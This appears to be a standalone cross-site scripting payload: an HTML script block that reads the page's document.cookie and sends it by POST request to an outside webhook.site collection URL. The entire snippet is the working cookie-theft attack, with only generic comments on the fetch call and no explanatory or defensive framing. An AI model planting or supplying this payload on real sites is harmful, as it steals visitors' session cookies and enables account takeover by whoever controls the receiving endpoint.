<script>
  cookie = document.cookie
   data ={
  thecookie: cookie,
};

  fetch("https://webhook.site/3b053481-b378-4203-9aab-23cd2dc2eba8", {
  method: "POST", // Specify the method
  headers: {
    "Content-Type": "application/json; charset=UTF-8", // Indicate the content type
  },
  body: JSON.stringify(data), // Convert the JavaScript object to a JSON string
});
  </script>
